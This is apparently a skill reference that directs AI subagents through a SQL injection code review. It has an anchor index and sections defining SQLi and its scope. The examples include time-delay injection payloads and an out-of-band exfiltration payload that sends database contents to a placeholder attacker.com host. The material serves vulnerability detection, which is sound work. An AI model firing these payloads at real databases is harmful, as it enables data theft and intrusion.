---
subject: "SQL injection detection reference for SAST subagents: SQLi definition and scope boundaries, prevention patterns, per-stack vulnerable/secure recipes (Python, FastAPI, Django, Flask, Node.js, Rails, Java, Go, PHP, C#, GraphQL, stored procedures, NoSQL), ORM kwargs injection CVE-2025-64459, variant taxonomy, ORM cheat sheet, payload library per DBMS, three-phase execution prompts, OWASP and CWE mappings."
index:
  - anchor: sqli-detection
    what: "Focused SQLi detection role using a three-phase subagent approach — recon, batched taint verification, merge — gated on the architecture report."
    problem: "Codebase needs systematic SQL injection sweep, yet unstructured hunting misses construction sites and drowns reviewers in unverified candidates; detection orchestration, taint sweep, phase pipeline, verified findings, audit rigor, candidate flood, methodical triage."
    use_when: "SQLi scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-phase detection must run."
    avoid_when: "Architecture report missing — run analysis first; only conceptual SQLi knowledge is needed, not execution."
    expected: "Verified SQLi findings consolidated into the module report with false positives filtered."
  - anchor: sqli-definition
    what: "Core definition of SQL injection: unvalidated, unparameterized input reaching a query execution call, amplified in API contexts."
    problem: "Reviewers disagree on what counts as injection without shared definition, so borderline patterns get classified inconsistently across teams and scans; concept baseline, query interpolation, shared vocabulary, classification consistency, definition anchor, scope clarity, common ground."
    use_when: "Onboarding to the scan; deciding whether a pattern belongs to SQLi at all; teaching the detection boundary."
    avoid_when: "Concrete stack recipes are needed — jump to the matching example anchor; execution workflow is the question."
    expected: "Everyone applies one definition: concatenated or interpolated input into SQL execution."
  - anchor: sqli-scope-in
    what: "Positive scope list: concatenation, string formatting, raw ORM calls, dynamic identifiers, and resolver-built queries that count as SQLi."
    problem: "Detectors under-report when positive pattern sets stay implicit, missing formatted strings, raw ORM methods, and dynamic identifiers; inclusion rules, inclusion catalog, raw queries, identifier interpolation, coverage completeness, missed sinks, string building."
    use_when: "Building or checking a recon sink list; unsure whether a construction style qualifies; calibrating false negatives."
    avoid_when: "Exclusions are the question — see the scope-out anchor; stack-specific syntax wanted."
    expected: "Every qualifying construction style is recognized and flagged during recon."
  - anchor: sqli-scope-out
    what: "Separation rules distinguishing SQLi from IDOR, mass assignment, XSS, command injection, and LDAP injection."
    problem: "Findings get double-reported or misrouted when injection boundaries stay fuzzy, corrupting severity and ownership across scans; misrouting risk, double reporting, class confusion, ownership clarity, dedup discipline, category overlap, fuzzy edges, triage errors."
    use_when: "A finding could belong to another scan class; triaging overlapping categories; writing cross-scan routing notes."
    avoid_when: "Positive patterns are needed — see scope-in; concrete per-stack examples wanted."
    expected: "Each candidate lands in exactly one vulnerability class."
  - anchor: sqli-prevention-patterns
    what: "Catalog of constructions that prevent SQLi: parameterized binding in six languages, safe ORM forms, and identifier allowlists for dynamic ORDER BY."
    problem: "Verify subagents need authoritative safe patterns to avoid flagging secured code, and scattered knowledge of binding styles produces false positives; safe construction, parameter idioms, allowlist identifiers, false-positive control, mitigation reference, secure baseline."
    use_when: "Classifying a candidate as mitigated; comparing site code against known-safe forms; writing remediation notes."
    avoid_when: "Vulnerable examples per stack are the need — see recipe anchors; payload strings wanted for dynamic tests."
    expected: "Parameterized, allowlisted, or ORM-safe code is correctly classified as not vulnerable."
  - anchor: sqli-ex-django-raw
    what: "Django recipe contrasting f-string misuse in `raw()` with parameterized `raw()` and ORM filtering."
    problem: "Django views using `raw()` or `RawSQL` with f-strings open direct injection despite ORM safe defaults; orm bypass, python web stack, view layer, params list, queryset escape, string formatting, model methods, queryset params."
    use_when: "Target uses Django; verify subagents need stack-matched examples; reviewing `raw()` and `RawSQL` usage in views."
    avoid_when: "Flask or SQLAlchemy-only stack — see the Flask recipe; async FastAPI code — see the FastAPI recipe."
    expected: "Unsafe Django patterns spotted and matched to their parameterized counterparts."
  - anchor: sqli-ex-flask-sqlalchemy
    what: "Flask/SQLAlchemy recipe contrasting f-string into `text()` with named bind values."
    problem: "Flask endpoints passing request data into `text()` via formatting create injection despite engine parameter support; flask routes, request taint, python microframework, session execute, blueprints, wsgi apps, route handlers, jinja context."
    use_when: "Target uses Flask with SQLAlchemy 1.x style; selecting examples for Python verify batches."
    avoid_when: "SQLAlchemy 2.0 async code — see the FastAPI recipe; Django stack — see the Django recipe."
    expected: "`text()` interpolation recognized and the `:param` binding form applied."
  - anchor: sqli-ex-fastapi-async
    what: "FastAPI recipe covering SQLAlchemy 2.0 `text()` binding, `select()` constructs, `asyncpg` `$1` placeholders, and `aiosqlite` `?` style."
    problem: "Async endpoints interpolate f-strings into `text()` or driver calls, and reviewers miss that concurrency changes nothing about injection; fastapi endpoints, asyncpg placeholders, aiosqlite, orm construct, coroutine code, await calls, event loop."
    use_when: "Target uses FastAPI, asyncpg, or aiosqlite; stack selection for asyncio Python services."
    avoid_when: "Sync Flask or Django stacks — see their recipes; non-Python targets."
    expected: "Async-site injection recognized; bound-parameter and `select()` forms confirmed as safe."
  - anchor: sqli-ex-sqlite3-psycopg2
    what: "DB-API recipe for `sqlite3` and `psycopg2`/`psycopg` v3 showing `%s` and `?` placeholder binding with a driver-version note."
    problem: "Direct driver usage bypasses ORM protections, and parameter style differences across drivers lead to formatting mistakes; db-api drivers, sqlite3 module, psycopg versions, positional binding, driver drift, cursor execute, manual queries, format strings."
    use_when: "Target calls drivers directly without ORM; Python services using sqlite3 or psycopg."
    avoid_when: "ORM-based access is used — see the Django or Flask recipes; async drivers — see the FastAPI recipe."
    expected: "Driver-level interpolation flagged; correct placeholder style per driver verified."
  - anchor: sqli-ex-nodejs-mysql2
    what: "mysql2 recipe contrasting template-literal queries with `?` placeholders and noting the `multipleStatements` hazard."
    problem: "Node services build queries by string interpolation, and mysql2's multi-statement option amplifies impact into stacked execution; mysql2 driver, multi statements, node backend, express mysql, escape pitfalls, backtick queries, connection pool, stacked risk."
    use_when: "Target uses mysql2; reviewing Express-era MySQL code."
    avoid_when: "PostgreSQL stack — see the pg recipe; Prisma usage — see the kwargs-injection recipe."
    expected: "Literal-built queries flagged; placeholder form and disabled multi-statements confirmed."
  - anchor: sqli-ex-nodejs-pg
    what: "node-postgres recipe contrasting string-built queries with `$1` positional parameters."
    problem: "PostgreSQL clients in Node built on string concatenation inject directly, while `$1` positional binding offers safe idiom; positional dollars, query builder misuse, javascript backend, express pg, pool config, dollar parameters, node datastores, node services, libpq binding."
    use_when: "Target uses node-postgres; selecting JS examples for PostgreSQL services."
    avoid_when: "MySQL stack — see mysql2; GraphQL resolvers — see the GraphQL recipes."
    expected: "Concatenated pg queries flagged; `$1` binding verified."
  - anchor: sqli-ex-rails
    what: "Rails recipe covering interpolation in `where()`, `find_by_sql`, and the parameterized hash/array forms."
    problem: "ActiveRecord's convenient string conditions tempt interpolation, and `find_by_sql` with embedded values bypasses sanitization entirely; rails activerecord, where interpolation, find_by_sql, hash syntax, arel escape, pluck risk, model scopes, controller params, relation chaining."
    use_when: "Target uses Rails; reviewing query code in models or controllers."
    avoid_when: "Other language stacks; raw driver usage without ActiveRecord."
    expected: "Interpolated conditions flagged; hash and placeholder forms confirmed safe."
  - anchor: sqli-ex-spring-jdbc
    what: "Java recipe contrasting concatenated `JdbcTemplate` queries with `?` placeholders."
    problem: "Java services building SQL strings into `JdbcTemplate` calls inject despite template parameter support; string concatenation, prepared statement style, enterprise java, named parameter, row mapper, repository layer, bean config, dao pattern."
    use_when: "Target uses Spring's `JdbcTemplate`; reviewing repository classes."
    avoid_when: "JPA/Hibernate usage — see the Hibernate recipe; non-Java stacks."
    expected: "Concatenated template calls flagged; placeholder usage verified."
  - anchor: sqli-ex-hibernate-native
    what: "Hibernate/JPA recipe contrasting concatenated `createNativeQuery` with bound parameters, plus HQL misuse awareness."
    problem: "Native queries in JPA reintroduce string-built SQL, and HQL built by concatenation injects through ORM layers themselves; jpa, entity manager, java orm, criteria api, jpql strings, session queries, persistence context, orm escape, typed queries."
    use_when: "Target uses Hibernate or JPA; reviewing `createNativeQuery` or HQL construction."
    avoid_when: "Plain JDBC — see Spring JDBC; non-Java stacks."
    expected: "Native and HQL concatenation flagged; parameter binding verified."
  - anchor: sqli-ex-go-database-sql
    what: "Go `database/sql` recipe contrasting concatenated queries with `$1`/`?` placeholders per driver."
    problem: "Go services fmt-Sprintf queries into `db.Query`, and placeholder style varies per driver, confusing reviewers; sprintf queries, pq placeholders, go mysql, backend go, sqlx, driver variance, query rows, stdlib data, error handling, rows scanning, conn pools, lib code."
    use_when: "Target uses Go's `database/sql`; reviewing handler or store code."
    avoid_when: "ORM-based Go without raw calls; non-Go stacks."
    expected: "Sprintf-built queries flagged; correct per-driver placeholders verified."
  - anchor: sqli-ex-php-pdo
    what: "PHP recipe contrasting interpolated `query()` calls with `prepare()` and bound values."
    problem: "PHP endpoints interpolating `$_GET` into PDO `query()` remain classic injection sources; superglobal taint, lamp stack, legacy php, bind param, shared hosting, pdo quote, get post input, wordpress style, mysql escape."
    use_when: "Target uses raw PHP with PDO; reviewing legacy endpoints."
    avoid_when: "Laravel or Eloquent code — see the Laravel recipe; non-PHP stacks."
    expected: "Interpolated PDO calls flagged; prepare/bindParam forms verified."
  - anchor: sqli-ex-php-laravel
    what: "Laravel recipe covering `whereRaw`, `DB::raw`, and `selectRaw` interpolation versus binding."
    problem: "Laravel's raw-expression helpers invite interpolation even in otherwise safe Eloquent codebases; whereraw, db raw, selectraw, expression misuse, query builder, binding arrays, artisan apps, facades, blade views, service container, eloquent scopes, migration files."
    use_when: "Target uses Laravel; reviewing raw-expression usage."
    avoid_when: "Plain PHP without Laravel — see the PDO recipe; non-PHP stacks."
    expected: "Raw-expression interpolation flagged; bound forms verified."
  - anchor: sqli-ex-csharp-adonet
    what: "ADO.NET recipe contrasting concatenated `SqlCommand` text with `@param` parameters."
    problem: "C# services building SQL by concatenation inject despite ADO.NET's parameter collections; csharp adonet, sqlcommand, add with value, dotnet backend, microsoft stack, dal code, sqlparameter, enterprise, connection objects, data readers, net framework, sql server backend, parameter arrays."
    use_when: "Target uses ADO.NET directly; reviewing data-access classes."
    avoid_when: "Entity Framework usage — see the EF recipe; non-.NET stacks."
    expected: "Concatenated commands flagged; `Parameters.Add` forms verified."
  - anchor: sqli-ex-csharp-ef
    what: "EF Core recipe covering `FromSqlRaw` versus `FromSqlInterpolated` and safe LINQ."
    problem: "EF Core's raw-SQL methods differ subtly, and choosing `FromSqlRaw` with interpolation reintroduces injection into LINQ-safe code; fromsqlraw, fromsqlinterpolated, linq, dotnet orm, interop methods, string form, db context, migration sql, linq safety, db sets."
    use_when: "Target uses EF Core; reviewing raw-SQL interop points."
    avoid_when: "Plain ADO.NET — see the ADO.NET recipe; non-.NET stacks."
    expected: "Unsafe raw method usage flagged; interpolated-safe variants verified."
  - anchor: sqli-ex-dynamic-order-by
    what: "Cross-stack recipe for dynamic ORDER BY and column names, where parameters cannot bind identifiers and allowlists are the only fix."
    problem: "Sortable endpoints pass field names into queries, and parameterization cannot bind identifiers, so explicit allowlists become sole defense; identifier injection, order by clause, unbindable names, dynamic fields, direction input, whitelist check, sortable grids."
    use_when: "Endpoints accept sort, column, or direction parameters; any stack."
    avoid_when: "Value-based filtering only — parameterization suffices there."
    expected: "Identifier interpolation flagged unless gated by explicit allowlists."
  - anchor: sqli-ex-orm-kwargs-injection
    what: "Recipe for ORM key injection via `filter(**kwargs)` and Prisma `orderBy`, including CVE-2025-64459's `_connector`/`_negated` abuse."
    problem: "Expanding user dictionaries into ORM methods injects control keys rather than values, flipping query logic behind parameterization; kwargs expansion, internal arguments, connector flip, negation toggle, orderby abuse, cve 2025 64459, dict splat, object spread, key filtering."
    use_when: "Django or Prisma in the stack; dynamic filter or sort objects built from requests."
    avoid_when: "Static query construction only; raw-SQL interpolation is the issue — see stack recipes."
    expected: "Key-injection sites flagged unless key allowlists gate expansion."
  - anchor: sqli-ex-graphql-nodejs
    what: "Node.js recipe showing resolver-level SQLi where GraphQL arguments flow into pg queries."
    problem: "Schema arguments feel structured yet land in raw queries inside resolvers, creating injection behind clean type definitions; argument taint, schema facade, api layer, apollo server, variables, type comfort, field resolution, query language."
    use_when: "Target exposes GraphQL on Node.js; reviewing resolver data fetching."
    avoid_when: "Python or Java GraphQL — see those recipes; REST-only APIs."
    expected: "Resolver-level concatenation flagged; parameterized resolver queries verified."
  - anchor: sqli-ex-graphql-python
    what: "GraphQL Python recipe with Graphene/SQLAlchemy resolvers passing arguments into queries."
    problem: "Python resolvers pass schema arguments into ORM or text queries, hiding injection behind typed definitions; graphene resolvers, sqlalchemy integration, schema trust, resolver sinks, strawberry, ariadne, typed facade, mutation inputs, query variables."
    use_when: "Target uses Graphene or Strawberry-style Python schemas."
    avoid_when: "Node or Java GraphQL — see those recipes; REST-only APIs."
    expected: "Resolver argument taint traced into query construction."
  - anchor: sqli-ex-graphql-java
    what: "Java recipe with graphql-java fetchers calling JDBC with argument-built SQL."
    problem: "Java data fetchers concatenate schema arguments into JDBC statements, bypassing type-system comfort; jdbc sinks, jvm graphql, spring for graphql, fetcher taint, dto mapping, connection handling, annotation wiring, boot starter, query dsl."
    use_when: "Target uses graphql-java or Spring's GraphQL support."
    avoid_when: "Node or Python GraphQL — see those recipes; REST-only APIs."
    expected: "Fetcher-level SQL building flagged; bound statements verified."
  - anchor: sqli-ex-stored-proc-plsql
    what: "PL/SQL recipe showing `EXECUTE IMMEDIATE` with concatenated arguments inside Oracle routines."
    problem: "Dynamic SQL inside stored procedures injects even when calling application code binds safely; plsql execute immediate, database-layer sinks, procedure arguments, hidden injection, using clause, cursor loops, dbms sql, routine concat."
    use_when: "Target calls Oracle routines; procedure source is available."
    avoid_when: "SQL Server or MySQL procedures — see those recipes; no stored procedures in play."
    expected: "Unsafe `EXECUTE IMMEDIATE` flagged; `USING` clause binding verified."
  - anchor: sqli-ex-stored-proc-tsql
    what: "T-SQL recipe showing `sp_executesql` misuse versus parameterized dynamic SQL."
    problem: "T-SQL procedures building strings for `sp_executesql` inject internally despite safe outer calls; sp_executesql, dynamic tsql, parameter passthrough, quotename misuse, exec concat, nvarchar assembly, sys modules, nested exec, print debug, temp tables."
    use_when: "Target calls T-SQL routines with dynamic arguments."
    avoid_when: "Oracle or MySQL routines — see those recipes; no stored procedures in play."
    expected: "Concatenated dynamic T-SQL flagged; parameterized `sp_executesql` verified."
  - anchor: sqli-ex-stored-proc-mysql
    what: "MySQL recipe showing `PREPARE`/`EXECUTE` built from concatenated procedure arguments."
    problem: "MySQL routines assembling statements via CONCAT open injection within database layers; prepare execute, procedure taint, statement assembly, definer rights, sys schema, routine bodies, hidden concat, delimiter blocks, sql mode, declare handlers."
    use_when: "Target calls MySQL routines; source code of routines can be reviewed."
    avoid_when: "Oracle or SQL Server procedures — see those recipes; no stored procedures in play."
    expected: "Concat-assembled statements flagged; variable-passing forms verified."
  - anchor: sqli-ex-stacked-queries
    what: "Recipe for batch and multi-statement injection where drivers allow several statements per call."
    problem: "Drivers with multi-statement support turn simple injection into stacked execution, adding writes and DDL to read-only intents; stacked queries, multi statements, batch execution, driver options, write amplification, query chaining, destructive potential."
    use_when: "Drivers like mysql2 `multipleStatements` or Connector/J `allowMultiQueries` are enabled."
    avoid_when: "Drivers enforce single statements; classic single-query injection is the concern."
    expected: "Multi-statement capability identified as an amplifier in findings."
  - anchor: sqli-ex-second-order
    what: "Second-order SQLi recipe where safely stored values are later interpolated into new queries."
    problem: "Stored user content trusted on read gets concatenated into later queries, evading input-time validation entirely; second order injection, stored payloads, deferred execution, delayed sinks, dormant taint, report builders, admin exports, latent payloads."
    use_when: "Code reads database values into subsequent query construction; batch or admin flows exist."
    avoid_when: "Direct request-to-query flows — the classic recipes cover those."
    expected: "Read-then-interpolate chains flagged despite safe initial writes."
  - anchor: sqli-ex-nosql-mongodb
    what: "MongoDB recipe covering operator injection via `$where` and object-shaped query input."
    problem: "JSON-bodied APIs forward objects into find calls, enabling operator injection that bypasses string-level sanitization; mongodb operators, dollar where, mongoose queries, json body taint, document store, gt ne filters, type juggling, bson payloads."
    use_when: "Target uses MongoDB or Mongoose; reviewing query construction from request bodies."
    avoid_when: "Relational stores — see SQL recipes; other NoSQL engines — see the wide NoSQL recipe."
    expected: "Operator-shaped input flagged; schema-validated queries verified."
  - anchor: sqli-ex-nosql-dynamodb
    what: "DynamoDB recipe contrasting concatenated `KeyConditionExpression` with expression-attribute binding."
    problem: "AWS SDK condition strings built by concatenation inject into DynamoDB queries despite placeholder support; key condition, boto3 queries, aws backend, partiql risk, scan filters, sdk misuse, table names, expression attributes, item collections."
    use_when: "Target uses DynamoDB via boto3 or AWS SDKs."
    avoid_when: "Document stores with JSON query DSLs — see MongoDB or Elasticsearch recipes."
    expected: "Concatenated expressions flagged; attribute-value binding verified."
  - anchor: sqli-ex-nosql-elasticsearch
    what: "Elasticsearch recipe contrasting string-built query DSL with structured DSL construction."
    problem: "Search endpoints concatenating into DSL bodies open injection through query layers; elasticsearch dsl, json dsl, python client, structure building, lucene syntax, opensearch, painless scripts, bool queries, match clauses, script fields."
    use_when: "Target uses Elasticsearch or OpenSearch."
    avoid_when: "Key-value or document stores — see other NoSQL recipes."
    expected: "String-built DSL flagged; structured construction verified."
  - anchor: sqli-ex-nosql-wide
    what: "Broad recipe covering Neo4j Cypher parameters, Cassandra CQL prepared statements, Redis `EVAL` via `KEYS`/`ARGV`, and ClickHouse column allowlists."
    problem: "Alternative datastores repeat identical concatenation mistakes in their own query languages, escaping SQL-focused review; cypher injection, cql statements, redis eval, graph queries, lua scripts, prepared cql, identifier filtering, kv stores, engine diversity."
    use_when: "Neo4j, Cassandra, Redis scripting, or ClickHouse present in the stack."
    avoid_when: "MongoDB, DynamoDB, or Elasticsearch — those have dedicated recipes."
    expected: "Per-engine concatenation flagged; parameter, prepared, `KEYS`/`ARGV`, or allowlist fixes verified."
  - anchor: sqli-variant-taxonomy
    what: "Table of API-relevant SQLi variants beyond classic relational injection, with attack examples and detection signals."
    problem: "Reviewers anchored on classic patterns miss second-order, stored-procedure, ORM-raw, NoSQL, and GraphQL variants present in modern APIs; variant coverage, taxonomy lookup, modern injection forms, missed classes, review breadth, pattern catalog, edge variants."
    use_when: "Scoping which variants apply to the architecture; expanding a recon checklist beyond classic SQLi."
    avoid_when: "Per-variant detection detail is needed — see the heuristics anchor; stack recipes wanted."
    expected: "All applicable variants enumerated for the target architecture."
  - anchor: sqli-detection-heuristics
    what: "Per-variant detection heuristics telling recon agents exactly which syntax patterns signal each SQLi variant."
    problem: "Knowing variants exist does not locate them, and without per-variant signals recon skips stored procedures, resolvers, and second-order chains; detection signals, recon heuristics, variant hunting, search patterns, signal checklist, grep targets."
    use_when: "Running or writing recon prompts; verifying recon coverage per variant."
    avoid_when: "Variant overview only — see the taxonomy anchor; payloads wanted for dynamic testing."
    expected: "Recon searches each variant with its concrete code signals."
  - anchor: sqli-orm-cheat-sheet
    what: "Lookup table of unsafe ORM methods per framework mapped to their secure counterparts."
    problem: "Verify agents need quick judgment on whether an ORM call is raw or safe without re-deriving it per framework; orm lookup, unsafe methods, quick reference, framework matrix, judgment aid, raw detection, method table, call classification."
    use_when: "Classifying a specific ORM call; checking remediation suggestions."
    avoid_when: "Full recipe context is needed — see the per-stack recipe anchors."
    expected: "Each ORM call classified raw-versus-safe from the table."
  - anchor: sqli-payload-library
    what: "Intro to the payload collection: probes for dynamic tests, paired with sqlmap when endpoints are reachable and testing is legal."
    problem: "Static findings need dynamic confirmation payloads, and ad-hoc probing wastes time or skips DBMS-specific channels; test payloads, probe library, legal testing, dbms coverage, validation tooling, proof strings, safe scope, consent bounds."
    use_when: "Dynamic test templates are being written; payloads must match the target DBMS."
    avoid_when: "Static review only; testing is not authorized."
    expected: "Correct per-DBMS probes selected for confirmation."
  - anchor: sqli-payloads-mysql
    what: "MySQL/MariaDB probe set including comment styles, version detection, and stacked or out-of-band options."
    problem: "Confirming MySQL injection needs dialect-correct probes, since comments, functions, and engines differ across databases; dialect specifics, comment syntax, version fingerprint, mariadb quirks, confirmation strings, outfile risk, information schema, concat tricks."
    use_when: "Target database is MySQL or MariaDB; writing dynamic tests."
    avoid_when: "Other DBMS — see the matching payload anchor."
    expected: "Dialect-correct probes chosen for MySQL or MariaDB."
  - anchor: sqli-payloads-postgresql
    what: "PostgreSQL probe set with `pg_sleep`, dollar-quoted bodies, and file/command functions where permitted."
    problem: "PostgreSQL confirmation relies on its own functions and quoting, and generic probes misfire or under-prove; pg sleep, time based, function calls, dialect proof, copy program, large objects, listen notify, cast errors, string variants."
    use_when: "Target database is PostgreSQL."
    avoid_when: "Other DBMS — see the matching payload anchor."
    expected: "Dialect-correct PostgreSQL probes chosen."
  - anchor: sqli-payloads-mssql
    what: "SQL Server probe set with `xp_cmdshell` awareness and T-SQL specifics."
    problem: "MSSQL confirmation needs T-SQL idioms and awareness of dangerous extended procedures; waitfor delay, xp cmdshell, tsql idioms, windows stack, dialect proof, batch separators, error based, oledb, openrowset, linked servers, unc paths, batching go."
    use_when: "Target database is SQL Server."
    avoid_when: "Other DBMS — see the matching payload anchor."
    expected: "Dialect-correct probes chosen for SQL Server."
  - anchor: sqli-payloads-oracle
    what: "Oracle probe set with PL/SQL context, `UTL_HTTP` out-of-band options, and `DUAL` idioms."
    problem: "Oracle confirmation requires its own idioms and network packages for out-of-band proof; plsql context, utl http, dialect proof, outbound channels, xml db, dbms pipes, hierarchy queries, error extraction, connect by, remote calls."
    use_when: "Target database is Oracle."
    avoid_when: "Other DBMS — see the matching payload anchor."
    expected: "Dialect-correct probes chosen for Oracle."
  - anchor: sqli-payloads-sqlite
    what: "SQLite probe set reflecting its limited but distinct function surface."
    problem: "SQLite's minimal engine changes which proofs are possible, and heavyweight probes fail silently; lightweight engine, function limits, local database, dialect proof, minimal surface, file based, embedded context, attach trick, journal mode."
    use_when: "Target database is SQLite."
    avoid_when: "Other DBMS — see the matching payload anchor."
    expected: "Dialect-correct probes chosen for SQLite."
  - anchor: sqli-payloads-nosql
    what: "NoSQL probe set for operator abuse and JavaScript-bearing fields."
    problem: "Document-store confirmation needs operator and JavaScript probes rather than SQL strings; javascript payloads, dollar operators, confirmation vectors, where clauses, server side js, bson input, mongo, aggregation stages, map reduce, eval legacy."
    use_when: "Target uses MongoDB-like document databases."
    avoid_when: "Relational targets — see DBMS payload anchors."
    expected: "NoSQL-appropriate probes chosen."
  - anchor: sqli-payloads-graphql
    what: "GraphQL resolver probe set for argument-level injection testing."
    problem: "Resolver injection needs probes delivered through GraphQL arguments and aliases, not classic form fields; argument delivery, alias batching, resolver testing, schema aware, injection vectors, operation names, query crafting, variable slots."
    use_when: "Target exposes GraphQL with database-backed resolvers."
    avoid_when: "REST endpoints — use DBMS payload anchors."
    expected: "Argument-level probes chosen for resolver tests."
  - anchor: sqli-execution-intro
    what: "Execution overview: three phases run by subagents with the architecture report passed as context to each."
    problem: "Detection work without orchestration structure duplicates effort and loses batch boundaries; execution model, phase overview, subagent orchestration, context passing, batch discipline, workflow entry, pipeline order, dispatch plan, coordination, uniform, staging."
    use_when: "Starting the SQLi scan execution; deciding how to dispatch subagents."
    avoid_when: "Specific phase prompts are needed — jump to phase anchors."
    expected: "All three phases dispatched with shared architecture context."
  - anchor: sqli-phase1-recon
    what: "Recon instructions telling the subagent to find every SQL construction site with variant-aware signals and skip lists."
    problem: "Unstructured searching misses construction sites or floods candidates with safe code, so recon needs explicit patterns and exclusions; site discovery, skip rules, candidate quality, coverage discipline, grep scope, noise control, thorough sweep."
    use_when: "Launching the recon subagent; reviewing recon completeness."
    avoid_when: "Candidates already gathered — proceed to verify; conceptual knowledge wanted."
    expected: "Complete, de-duplicated candidate list of injection sites."
  - anchor: sqli-phase1-gate
    what: "Zero-candidate short-circuit: emit a clean no-findings stub and stop when recon finds nothing."
    problem: "Pipeline without early exit wastes verify batches on empty candidate sets and leaves missing artifacts; empty recon, pipeline efficiency, artifact completeness, stop rule, graceful halt, zero results, idle batches, skipped verify."
    use_when: "Recon returned zero candidates."
    avoid_when: "Candidates exist — proceed to batched verification."
    expected: "No-findings stub written and the scan stops gracefully."
  - anchor: sqli-phase2-verify
    what: "Batched taint-analysis prompt tracing input to each candidate sink, with safeguard assessment and the verdict rubric."
    problem: "Unverified candidates are noise, and serial verification is slow, so batched taint tracing with explicit rubric is required; batch processing, parallel analysis, evidence tracing, sink confirmation, flow proof, verdict labels, parallel batches, sink verdicts."
    use_when: "Candidates confirmed present; dispatching verify subagents in batches of three."
    avoid_when: "Recon incomplete; merge stage is the need."
    expected: "Every candidate classified with traced evidence and mitigation assessment."
  - anchor: sqli-phase3-merge
    what: "Merge procedure consolidating batch reports into the final module report with dedup and the output template."
    problem: "Parallel batch outputs overlap and diverge, and without merge discipline final reports duplicate or lose findings; result merging, dedup, consolidation, final template, partial results, report integrity, single file, clean handoff, overlap removal."
    use_when: "All verify batches finished; producing `02_sqli.md`."
    avoid_when: "Batches still running; recon stage not done."
    expected: "Single consolidated module report with unique, classified findings."
  - anchor: sqli-owasp-mapping
    what: "Mapping of SQLi findings to OWASP API 2023 risks, since that edition has no injection category."
    problem: "Findings need correct 2023-era taxonomy, and assuming dedicated injection category mislabels everything; taxonomy mapping, risk routing, classification accuracy, edition awareness, risk labeling, correct tagging, category shift, compliance notes, traceability, version drift."
    use_when: "Tagging detected issues with the 2023 risk taxonomy; writing the report's risk section."
    avoid_when: "CWE-level tagging is the question — see the CWE anchor."
    expected: "Findings mapped to the correct API risks with explicit reasoning."
  - anchor: sqli-cwe-references
    what: "Guidance assigning CWE-89 as primary, related entries, and the rule against using CWE-78 for SQLi."
    problem: "Wrong CWE assignment breaks downstream tooling and metrics, especially command-injection confusion; weakness taxonomy, cwe 89, misclassification risk, tooling accuracy, reference lookup, identifier precision, reporting feeds, consistency, dedup keys, scanner alignment, scoring feeds."
    use_when: "Assigning CWE identifiers to findings."
    avoid_when: "OWASP risk mapping is the question — see the OWASP anchor."
    expected: "Each finding carries the correct CWE identifier."
  - anchor: sqli-reminders
    what: "Operational guardrails: escaping is not parameterization, evidence requirements, report discipline."
    problem: "Under pressure, agents accept escaping as mitigation, skip evidence, or overstate severity, corrupting report quality; mitigation rigor, evidence demand, severity honesty, quality guardrails, review discipline, trap avoidance, false comfort, checklist, last pass."
    use_when: "Reviewing draft findings before merge; calibrating classifications."
    avoid_when: "Specific recipes or payload syntax are the question — see the recipe and payload anchors; this card only guards finding quality."
    expected: "Merged findings carry proof for every claim, escaping never counted as a fix, and severity matches demonstrated impact."
  - anchor: sqli-references
    what: "External link list for SQLi concepts, guidance documents, and tooling."
    problem: "Agents and readers need authoritative follow-up sources beyond this file's distilled content; further reading, tooling docs, external canon, deep dives, vendor documentation, community knowledge, standards, primary material, owasp pages, cited works."
    use_when: "Primary sources or extended material is needed."
    avoid_when: "Detection recipes or execution workflow are the question — the references list is follow-up reading, not procedure."
    expected: "Reader reaches canonical external material for any topic this file condenses."
---

# SQL Injection (SQLi) Detection

[ref: #sqli-detection]

You are performing a focused security assessment to find SQL injection vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find vulnerable SQL construction sites), **batched verify** (taint analysis in parallel batches of 3), and **merge** (consolidate batch reports into one file).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## What is SQL Injection
[ref: #sqli-definition]

SQL injection occurs when user-supplied input is incorporated into SQL queries through string concatenation or interpolation rather than parameterized binding. This allows attackers to alter query logic, bypass authentication, extract sensitive data, modify or delete records, and in some configurations execute OS commands.

The core pattern: *unvalidated, unparameterized user input reaches a SQL query execution call.*

In API contexts the risk is amplified: endpoints often accept JSON, query parameters, path variables, or GraphQL arguments that are mapped directly to database queries; a single vulnerable resolver or repository method can expose the entire data store.

### What SQLi IS
[ref: #sqli-scope-in]

- Concatenating user input directly into a SQL string: `"SELECT * FROM users WHERE name = '" + username + "'"`
- Using string formatting to build queries: `f"SELECT * FROM orders WHERE id = {order_id}"`
- Dynamic `ORDER BY` / `GROUP BY` / table/column names from user input with no allowlist validation
- ORM raw query methods with unsanitized input: `User.objects.raw(f"SELECT * WHERE id={id}")`, `$queryRawUnsafe(input)`, `FromSqlRaw("..." + var)`
- Second-order injection: input is stored in the DB and later used in a raw query without re-parameterization
- Stored-procedure SQLi: dynamic SQL built inside a stored procedure via `EXECUTE IMMEDIATE`, `sp_executesql`, `PREPARE/EXECUTE`, `OPEN ... FOR sql_string`, or string concatenation
- Batch / stacked-query injection: code passes raw strings to `execute()` without prepared-statement mode, allowing `;` multi-statement payloads
- Time-based blind SQLi: injectable parameter is used in a query where a time-delay payload (`SLEEP(5)`, `pg_sleep(5)`) causes a measurable delay
- Boolean-based blind SQLi: true/false payloads produce measurably different response content or status codes
- GraphQL resolver SQLi: resolver arguments are interpolated into raw SQL or unsafe ORM calls
- NoSQL injection: attackers inject query operators (`$ne`, `$where`, `$regex`) into MongoDB, DynamoDB expressions, Elasticsearch/Lucene DSL, or other non-relational query languages
- Out-of-band SQLi: payloads that cause the database to issue DNS or HTTP requests (e.g., `LOAD_FILE(CONCAT('\\\\',SUBSTRING(...),'.attacker.com\\a.txt'))`)

### What SQLi is NOT
[ref: #sqli-scope-out]

Do not flag these as SQLi:

- **IDOR**: Changing `?id=1` to `?id=2` to access another user's data — that's Insecure Direct Object Reference, a separate class
- **Mass assignment**: Setting extra ORM model fields from user input — different vulnerability
- **XSS via database**: Storing a `<script>` tag in the DB that's later rendered unescaped — that's XSS, not SQLi
- **Command injection**: User input passed to `os.system`, `exec`, `Runtime.getRuntime().exec`, etc. — separate class
- **LDAP injection**: Input concatenated into LDAP filter strings — separate class
- **Safe ORM queries**: Parameterized ORM lookups like `User.objects.filter(id=user_id)` or `User.find(params[:id])` — do not flag these

### Patterns That Prevent SQLi
[ref: #sqli-prevention-patterns]

When you see these patterns, the code is likely **not vulnerable**:
